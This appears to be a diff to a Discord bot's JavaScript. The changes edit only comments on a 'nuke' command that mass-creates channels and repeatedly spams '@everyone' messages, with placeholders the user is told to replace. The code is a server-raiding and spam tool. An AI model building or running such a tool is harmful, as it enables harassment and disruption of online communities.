@@ -19,7 +19,7 @@ client.on("message", async message => {
     if (msg == "nuke") {
         
         await guild.channels
-            .create("CHANNEL_NAME", {        // "CHANNEL_NAME" is the name of channels that bot will create
+            .create("CHANNEL_NAME", {        // "CHANNEL_NAME" is the name of channels that bot will create, you have to change all "CHANNEL_NAME"
                 type: "text",
             })
 
@@ -153,7 +153,7 @@ client.on("message", async message => {
                 type: "text",
             })
 
-        await message.channel.send(`@everyone YOUR MESSAGE`)        // "YOUR MESSAGE" is the message that bot will spam on command channel
+        await message.channel.send(`@everyone YOUR MESSAGE`)        // "YOUR MESSAGE" is the message that bot will spam on command channel, you have to change all "YOUR MESSAGE"
         await message.channel.send(`@everyone YOUR MESSAGE`)
         await message.channel.send(`@everyone YOUR MESSAGE`)
         await message.channel.send(`@everyone YOUR MESSAGE`)
